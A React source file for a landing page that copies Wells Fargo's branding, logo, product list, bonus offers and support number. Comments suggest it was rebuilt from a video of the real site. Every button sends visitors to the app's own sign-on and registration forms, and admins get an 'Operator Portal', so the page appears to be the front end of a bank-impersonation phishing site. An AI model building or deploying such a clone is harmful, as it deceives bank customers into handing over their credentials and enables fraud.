import React, { useState } from 'react';
import { 
  Search, 
  X, 
  Menu, 
  ChevronRight, 
  ShieldCheck, 
  Smartphone, 
  PiggyBank, 
  CreditCard, 
  Home, 
  FileText, 
  Car, 
  TrendingUp, 
  Award, 
  Calculator,
  GraduationCap,
  Percent
} from 'lucide-react';
import { useAuth } from '../context/AuthContext.tsx';

// Generated authentic visual assets
import manAndDogImg from '../assets/images/man_and_dog_1790812195803.jpg';
import hikersImg from '../assets/images/hikers_high_five_1790812209147.jpg';
import rewardsCardsImg from '../assets/images/rewards_cards_1790812222686.jpg';
import whoWeAreImg from '../assets/images/who_we_are_1790812234532.jpg';

interface LandingPageProps {
  onOpenAuth: (mode: 'login' | 'register') => void;
  onGoToPortal?: () => void;
}

export const LandingPage: React.FC<LandingPageProps> = ({ onOpenAuth, onGoToPortal }) => {
  const { currentUser, isAdmin } = useAuth();
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');

  // Modals for interactive buttons
  const [activeModal, setActiveModal] = useState<{ title: string; content: string } | null>(null);

  const productsList = [
    {
      id: 'checking',
      title: 'Checking',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-purple-100 flex items-center justify-center text-purple-700 shadow-sm">
          <Smartphone className="w-6 h-6" />
        </div>
      ),
      action: () => onOpenAuth('register')
    },
    {
      id: 'savings',
      title: 'Savings & CDs',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-amber-100 flex items-center justify-center text-amber-600 shadow-sm">
          <PiggyBank className="w-6 h-6" />
        </div>
      ),
      action: () => onOpenAuth('register')
    },
    {
      id: 'cards',
      title: 'Credit Cards',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-red-100 flex items-center justify-center text-[#d71e28] shadow-sm">
          <CreditCard className="w-6 h-6" />
        </div>
      ),
      action: () => onOpenAuth('register')
    },
    {
      id: 'home',
      title: 'Home Loans',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-blue-100 flex items-center justify-center text-blue-700 shadow-sm">
          <Home className="w-6 h-6" />
        </div>
      ),
      action: () => onOpenAuth('register')
    },
    {
      id: 'personal',
      title: 'Personal Loans',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-orange-100 flex items-center justify-center text-orange-600 shadow-sm">
          <FileText className="w-6 h-6" />
        </div>
      ),
      action: () => onOpenAuth('register')
    },
    {
      id: 'auto',
      title: 'Auto Loans',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-rose-100 flex items-center justify-center text-rose-600 shadow-sm">
          <Car className="w-6 h-6" />
        </div>
      ),
      action: () => onOpenAuth('register')
    },
    {
      id: 'investing',
      title: 'Investing',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-indigo-100 flex items-center justify-center text-indigo-700 shadow-sm">
          <TrendingUp className="w-6 h-6" />
        </div>
      ),
      action: () => onOpenAuth('register')
    },
    {
      id: 'premier',
      title: 'Premier',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-purple-100 flex items-center justify-center text-purple-800 shadow-sm">
          <Award className="w-6 h-6" />
        </div>
      ),
      action: () => onOpenAuth('register')
    },
    {
      id: 'education',
      title: 'Education & Tools',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-pink-100 flex items-center justify-center text-pink-600 shadow-sm">
          <Calculator className="w-6 h-6" />
        </div>
      ),
      action: () => onOpenAuth('register')
    }
  ];

  return (
    <div className="min-h-screen bg-white text-slate-900 font-sans selection:bg-[#d71e28] selection:text-white">
      
      {/* ---------------- 1. EXACT BRAND HEADER BAR ---------------- */}
      <header className="sticky top-0 z-50 bg-[#d71e28]">
        {/* Main Red Brand Container */}
        <div className="max-w-2xl sm:max-w-3xl lg:max-w-4xl mx-auto px-4 h-16 flex items-center justify-between">
          
          {/* Left: Classic Two-Line Bold Serif Logo */}
          <div 
            onClick={() => { setIsMenuOpen(false); window.scrollTo({ top: 0, behavior: 'smooth' }); }}
            className="cursor-pointer select-none"
          >
            <div className="leading-tight">
              <span className="block text-xl sm:text-2xl font-black font-serif tracking-normal text-white uppercase">
                WELLS
              </span>
              <span className="block text-xl sm:text-2xl font-black font-serif tracking-normal text-white uppercase -mt-1.5">
                FARGO
              </span>
            </div>
          </div>

          {/* Right: Sign On Pill + Menu Button */}
          <div className="flex items-center gap-3">
            {currentUser ? (
              <button
                onClick={onGoToPortal}
                className="px-4 py-1.5 rounded-full bg-white hover:bg-slate-100 text-[#d71e28] font-bold text-xs sm:text-sm shadow-sm transition-transform active:scale-95"
              >
                {isAdmin ? 'Operator Portal' : 'My Account'}
              </button>
            ) : (
              <button
                onClick={() => onOpenAuth('login')}
                className="px-5 py-1.5 rounded-full bg-white hover:bg-slate-100 text-[#d71e28] font-bold text-xs sm:text-sm shadow-sm transition-transform active:scale-95"
              >
                Sign On
              </button>
            )}

            {/* Red Square Menu / Close Button */}
            <button
              onClick={() => setIsMenuOpen(!isMenuOpen)}
              className="flex flex-col items-center justify-center w-12 h-12 bg-[#b8141d] hover:bg-[#a10e16] text-white rounded transition-colors"
              aria-label="Menu"
            >
              {isMenuOpen ? (
                <>
                  <X className="w-5 h-5 stroke-[2.5]" />
                  <span className="text-[9px] font-bold tracking-wider uppercase mt-0.5">CLOSE</span>
                </>
              ) : (
                <>
                  <Menu className="w-5 h-5 stroke-[2.5]" />
                  <span className="text-[9px] font-bold tracking-wider uppercase mt-0.5">MENU</span>
                </>
              )}
            </button>
          </div>

        </div>

        {/* Gold Accent Stripe */}
        <div className="h-1 bg-[#ffbf00]" />
      </header>

      {/* ---------------- 2. EXACT SLIDE-OUT MENU DRAWER (00:14 - 00:20) ---------------- */}
      {isMenuOpen && (
        <div className="fixed inset-x-0 top-[68px] bottom-0 z-40 bg-white overflow-y-auto animate-in slide-in-from-top duration-200">
          <div className="max-w-2xl sm:max-w-3xl lg:max-w-4xl mx-auto px-4 py-4 space-y-4">
            
            {/* Search Input Bar */}
            <div className="relative">
              <Search className="w-5 h-5 text-slate-400 absolute left-3.5 top-3.5" />
              <input
                type="text"
                placeholder="Search"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full pl-11 pr-4 py-3 rounded-lg bg-slate-100 border border-slate-300 text-sm font-medium text-slate-900 focus:outline-none focus:border-[#d71e28]"
              />
            </div>

            {/* Active Gold Category Header */}
            <div className="bg-[#ffbf00] text-slate-950 font-bold text-base px-4 py-3 rounded flex items-center justify-between">
              <span>Personal</span>
            </div>

            {/* Personal Category Links with Purple/Red Chevrons */}
            <div className="divide-y divide-slate-100 border-b border-slate-200">
              {[
                { name: 'Checking', action: () => onOpenAuth('register') },
                { name: 'Savings & CDs', action: () => onOpenAuth('register') },
                { name: 'Credit Cards', action: () => onOpenAuth('register') },
                { name: 'Home Loans', action: () => onOpenAuth('register') },
                { name: 'Personal Loans', action: () => onOpenAuth('register') },
                { name: 'Auto Loans', action: () => onOpenAuth('register') },
                { name: 'Premier', action: () => onOpenAuth('register') },
                { name: 'Education & Tools', action: () => onOpenAuth('register') }
              ].map((item) => (
                <button
                  key={item.name}
                  onClick={() => {
                    item.action();
                    setIsMenuOpen(false);
                  }}
                  className="w-full py-3.5 px-3 flex items-center justify-between hover:bg-slate-50 transition-colors text-left"
                >
                  <span className="font-semibold text-slate-900 text-sm">
                    {item.name}
                  </span>
                  <ChevronRight className="w-5 h-5 text-[#8b1874]" />
                </button>
              ))}
            </div>

            {/* Other Divisions List */}
            <div className="space-y-1 pt-2 divide-y divide-slate-100">
              {[
                'Investing & Wealth Management',
                'Business',
                'Commercial Banking',
                'Corporate & Investment Banking',
                'About Wells Fargo'
              ].map((divName) => (
                <button
                  key={divName}
                  onClick={() => {
                    setIsMenuOpen(false);
                    onOpenAuth('register');
                  }}
                  className="w-full py-3 px-3 text-left font-semibold text-slate-800 hover:text-[#d71e28] text-sm block transition-colors"
                >
                  {divName}
                </button>
              ))}
            </div>

            {/* Menu Footer Utility Links */}
            <div className="pt-4 border-t border-slate-200 text-xs text-slate-700 space-y-3 px-3 pb-8">
              <button 
                onClick={() => { setIsMenuOpen(false); setActiveModal({ title: 'ATMs & Locations', content: 'Explore our 12,000+ ATMs and financial centers worldwide.' }); }}
                className="block hover:underline"
              >
                ATMs/Locations
              </button>
              <button 
                onClick={() => { setIsMenuOpen(false); setActiveModal({ title: 'Customer Service & FAQs', content: '24/7 Wells Fargo client care desk is ready to assist you. Call 1-800-WELLS-FARGO or use our 24/7 Live Support Chat.' }); }}
                className="block hover:underline"
              >
                Customer service and FAQs
              </button>
              <button 
                onClick={() => { setIsMenuOpen(false); setActiveModal({ title: 'Español', content: 'Servicio al cliente disponible en español.' }); }}
                className="block hover:underline"
              >
                Español
              </button>
            </div>

          </div>
        </div>
      )}

      {/* ---------------- 3. HERO CHECKING BONUS SECTION (00:02 - 00:03) ---------------- */}
      <section className="bg-white py-12 sm:py-16 text-center border-b border-slate-100">
        <div className="max-w-xl mx-auto px-4 space-y-3">
          
          {/* "Enjoy" script in purple */}
          <p className="text-2xl font-serif text-[#761c46] italic font-normal">
            Enjoy
          </p>

          {/* Large $325 in serif */}
          <div className="text-6xl sm:text-7xl font-bold font-serif text-slate-900 tracking-tight">
            $325
          </div>

          {/* Headline */}
          <h1 className="text-2xl sm:text-3xl font-bold text-slate-900 pt-2 tracking-tight">
            $325 checking bonus on us
          </h1>

          {/* Subtitle */}
          <p className="text-sm text-slate-600 max-w-md mx-auto leading-relaxed pt-1">
            New customers open an eligible checking account with qualifying direct deposits
          </p>

          {/* "Get started >>" rounded outline pill button */}
          <div className="pt-4">
            <button
              onClick={() => onOpenAuth('register')}
              className="inline-flex items-center gap-1.5 px-8 py-2.5 rounded-full border border-slate-900 hover:bg-slate-900 hover:text-white text-slate-900 font-semibold text-sm transition-all"
            >
              <span>Get started</span>
              <span className="font-bold">&gt;&gt;</span>
            </button>
          </div>

        </div>
      </section>

      {/* ---------------- 4. VERTICAL PRODUCT LIST (00:03 - 00:06) ---------------- */}
      <section className="bg-white py-4 max-w-xl sm:max-w-2xl mx-auto px-4">
        <div className="divide-y divide-slate-100 border-b border-slate-100">
          {productsList.map((item) => (
            <button
              key={item.id}
              onClick={item.action}
              className="w-full py-4 px-2 flex items-center gap-4 hover:bg-slate-50 transition-colors text-left group"
            >
              <div className="shrink-0 group-hover:scale-105 transition-transform">
                {item.icon}
              </div>
              <span className="text-base font-semibold text-slate-900 group-hover:text-[#d71e28] transition-colors">
                {item.title}
              </span>
            </button>
          ))}
        </div>
      </section>

      {/* ---------------- 5. SPECIAL PROMOTIONAL CARDS (00:06 - 00:08) ---------------- */}
      <section className="py-8 max-w-xl sm:max-w-2xl mx-auto px-4 space-y-4">
        
        {/* Card 1: $125 Bonus */}
        <div className="p-5 rounded-xl bg-white border border-slate-200 shadow-sm flex items-start gap-4">
          <div className="w-8 h-8 flex items-center justify-center text-[#d71e28] shrink-0 mt-0.5">
            <GraduationCap className="w-7 h-7 stroke-[1.5]" />
          </div>
          <div className="space-y-1.5 flex-1">
            <h3 className="text-base font-bold text-slate-900">
              New customer? Say hello to a $125 bonus
            </h3>
            <p className="text-xs text-slate-600 leading-relaxed">
              Open a Clear Access Banking account, great for students &amp; more, complete offer requirements
            </p>
            <button
              onClick={() => onOpenAuth('register')}
              className="text-xs font-bold text-[#8b1874] hover:underline flex items-center gap-1 pt-1"
            >
              <span>See offer details</span>
              <span>&gt;</span>
            </button>
          </div>
        </div>

        {/* Card 2: 60,000 Bonus Points */}
        <div className="p-5 rounded-xl bg-white border border-slate-200 shadow-sm flex items-start gap-4">
          <div className="w-8 h-8 flex items-center justify-center text-[#d71e28] shrink-0 mt-0.5">
            <CreditCard className="w-7 h-7 stroke-[1.5]" />
          </div>
          <div className="space-y-1.5 flex-1">
            <h3 className="text-base font-bold text-slate-900">
              Earn 60,000 bonus points
            </h3>
            <p className="text-xs text-slate-600 leading-relaxed">
              when you spend $4,000 in purchases in the first 3 months. Terms apply.
            </p>
            <button
              onClick={() => onOpenAuth('register')}
              className="text-xs font-bold text-[#8b1874] hover:underline flex items-center gap-1 pt-1"
            >
              <span>Learn more</span>
              <span>&gt;</span>
            </button>
          </div>
        </div>

        {/* Card 3: Find a Credit Card */}
        <div className="p-5 rounded-xl bg-white border border-slate-200 shadow-sm flex items-start gap-4">
          <div className="w-8 h-8 flex items-center justify-center text-[#d71e28] shrink-0 mt-0.5">
            <CreditCard className="w-7 h-7 stroke-[1.5]" />
          </div>
          <div className="space-y-1.5 flex-1">
            <h3 className="text-base font-bold text-slate-900">
              Find a credit card
            </h3>
            <p className="text-xs text-slate-600 leading-relaxed">
              Low intro rate, cash back, rewards and more
            </p>
            <button
              onClick={() => onOpenAuth('register')}
              className="text-xs font-bold text-[#8b1874] hover:underline flex items-center gap-1 pt-1"
            >
              <span>Learn more</span>
              <span>&gt;</span>
            </button>
          </div>
        </div>

        {/* Card 4: Interest Rates Today */}
        <div className="p-5 rounded-xl bg-white border border-slate-200 shadow-sm flex items-start gap-4">
          <div className="w-8 h-8 flex items-center justify-center text-[#ffbf00] shrink-0 mt-0.5">
            <Percent className="w-7 h-7 stroke-[2]" />
          </div>
          <div className="space-y-1.5 flex-1">
            <h3 className="text-base font-bold text-slate-900">
              Interest rates today
            </h3>
            <button
              onClick={() => onOpenAuth('register')}
              className="text-xs font-bold text-[#8b1874] hover:underline flex items-center gap-1 pt-1"
            >
              <span>Learn more</span>
              <span>&gt;</span>
            </button>
          </div>
        </div>

      </section>

      {/* ---------------- 6. ONE KEY REWARDS CARD BANNER (00:08 - 00:09) ---------------- */}
      <section className="py-8 max-w-xl sm:max-w-2xl mx-auto px-4">
        <div className="rounded-xl overflow-hidden bg-white border border-slate-200 shadow-sm">
          {/* Card Showcase Graphic */}
          <div className="w-full overflow-hidden">
            <img 
              src={rewardsCardsImg} 
              alt="Wells Fargo One Key Rewards Credit Cards"
              className="w-full h-auto object-cover max-h-64 sm:max-h-72" 
            />
          </div>

          {/* Text and Action */}
          <div className="p-6 text-center space-y-3">
            <h2 className="text-2xl font-serif text-slate-900 font-normal">
              Earn up to $350 in One Key rewards
            </h2>
            <p className="text-xs text-slate-600 max-w-md mx-auto leading-relaxed">
              Use rewards on eligible bookings on Expedia®, Hotels.com®, and Vrbo®. Terms apply.
            </p>
            <div className="pt-2">
              <button
                onClick={() => onOpenAuth('register')}
                className="px-8 py-2.5 rounded-full border border-slate-900 hover:bg-slate-900 hover:text-white text-slate-900 font-semibold text-xs transition-colors"
              >
                Learn more
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* ---------------- 7. FINANCIAL GUIDANCE AND SUPPORT (00:09 - 00:11) ---------------- */}
      <section className="py-8 max-w-xl sm:max-w-2xl mx-auto px-4 space-y-6">
        
        {/* Section Heading */}
        <div className="text-center pt-2">
          <h2 className="text-2xl sm:text-3xl font-serif text-slate-900 font-normal">
            Financial guidance and support
          </h2>
        </div>

        {/* Card 1: Man and Dog - "Secure your next chapter" */}
        <div className="rounded-xl overflow-hidden bg-white border border-slate-200 shadow-sm">
          <div className="w-full overflow-hidden">
            <img 
              src={manAndDogImg} 
              alt="Man with golden retriever in sunlit field"
              className="w-full h-52 sm:h-64 object-cover" 
            />
          </div>
          <div className="p-6 space-y-3">
            <h3 className="text-xl font-bold text-slate-900 tracking-tight">
              Secure your next chapter
            </h3>
            <p className="text-xs text-slate-600 leading-relaxed">
              Protect what you've built as you look ahead
            </p>
            <div className="pt-1">
              <button
                onClick={() => onOpenAuth('register')}
                className="w-full sm:w-auto px-8 py-2.5 rounded-full border border-slate-900 hover:bg-slate-900 hover:text-white text-slate-900 font-semibold text-xs transition-colors"
              >
                Unlock your options
              </button>
            </div>
          </div>
        </div>

        {/* Card 2: Hikers High-Five - "Your dreams, your plan" */}
        <div className="rounded-xl overflow-hidden bg-white border border-slate-200 shadow-sm">
          <div className="w-full overflow-hidden">
            <img 
              src={hikersImg} 
              alt="Two hikers high-fiving on mountain summit"
              className="w-full h-52 sm:h-64 object-cover" 
            />
          </div>
          <div className="p-6 space-y-3">
            <h3 className="text-xl font-bold text-slate-900 tracking-tight">
              Your dreams, your plan
            </h3>
            <p className="text-xs text-slate-600 leading-relaxed">
              Start crafting the foundation for the future you see yourself in
            </p>
            <div className="pt-1">
              <button
                onClick={() => onOpenAuth('register')}
                className="w-full sm:w-auto px-8 py-2.5 rounded-full border border-slate-900 hover:bg-slate-900 hover:text-white text-slate-900 font-semibold text-xs transition-colors"
              >
                Get started
              </button>
            </div>
          </div>
        </div>

      </section>

      {/* ---------------- 8. FRAUD & SCAM ALERT (00:11 - 00:12) ---------------- */}
      <section className="py-6 max-w-xl sm:max-w-2xl mx-auto px-4">
        <div className="p-6 rounded-xl bg-white border border-slate-200 shadow-sm space-y-4">
          
          {/* Header with Gold Shield */}
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-amber-400/20 text-amber-500 flex items-center justify-center shrink-0">
              <ShieldCheck className="w-7 h-7 text-amber-500 fill-amber-400" />
            </div>
            <div>
              <h4 className="text-base font-bold text-slate-900">
                Fraud &amp; Scam Alert
              </h4>
              <p className="text-xs text-slate-500">
                The latest news and what to watch for
              </p>
            </div>
          </div>

          {/* Headline & Description */}
          <div className="space-y-1">
            <h3 className="text-xl font-bold text-slate-900">
              Think it's your bank? Look again.
            </h3>
            <p className="text-xs text-slate-600 leading-relaxed">
              Learn what to do if a scammer calls
            </p>
          </div>

          {/* Button: "Get 5 tips" */}
          <div className="pt-1">
            <button
              onClick={() => setActiveModal({
                title: 'Fraud & Scam Defense: 5 Key Tips',
                content: '1. Never share your transaction PIN or one-time codes over the phone.\n2. Hang up and dial the official number on the back of your card.\n3. Do not rush to transfer funds to any "safe" account.\n4. Enable biometric sign-on and notifications.\n5. Report suspicious calls or phishing SMS immediately.'
              })}
              className="w-full sm:w-auto px-8 py-2.5 rounded-full border border-slate-900 hover:bg-slate-900 hover:text-white text-slate-900 font-semibold text-xs transition-colors"
            >
              Get 5 tips
            </button>
          </div>

        </div>
      </section>

      {/* ---------------- 9. WHO WE ARE (00:23 - 00:24) ---------------- */}
      <section className="py-6 max-w-xl sm:max-w-2xl mx-auto px-4 pb-16">
        <div className="rounded-xl overflow-hidden bg-white border border-slate-200 shadow-sm">
          <div className="w-full overflow-hidden">
            <img 
              src={whoWeAreImg} 
              alt="Community volunteers"
              className="w-full h-48 sm:h-56 object-cover" 
            />
          </div>
          <div className="p-6 space-y-3">
            <h3 className="text-xl font-bold text-slate-900 tracking-tight">
              Who we are
            </h3>
            <p className="text-xs text-slate-600 leading-relaxed">
              Wells Fargo helps strengthen communities through inclusion, economic empowerment, and sustainability.
            </p>
            <div className="pt-1">
              <button
                onClick={() => onOpenAuth('register')}
                className="w-full sm:w-auto px-8 py-2.5 rounded-full border border-slate-900 hover:bg-slate-900 hover:text-white text-slate-900 font-semibold text-xs transition-colors"
              >
                About Wells Fargo
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* ---------------- MODAL FOR TIPS & DETAILS ---------------- */}
      {activeModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/60 backdrop-blur-sm animate-in fade-in">
          <div className="bg-white rounded-2xl max-w-md w-full p-6 space-y-4 shadow-2xl">
            <div className="flex justify-between items-center border-b pb-3">
              <h3 className="font-bold text-slate-900 text-base">
                {activeModal.title}
              </h3>
              <button 
                onClick={() => setActiveModal(null)}
                className="p-1 rounded-lg text-slate-400 hover:text-slate-700"
              >
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="text-xs text-slate-600 leading-relaxed whitespace-pre-line">
              {activeModal.content}
            </div>
            <button
              onClick={() => setActiveModal(null)}
              className="w-full py-2.5 rounded-xl bg-slate-900 text-white font-bold text-xs"
            >
              Close
            </button>
          </div>
        </div>
      )}

    </div>
  );
};
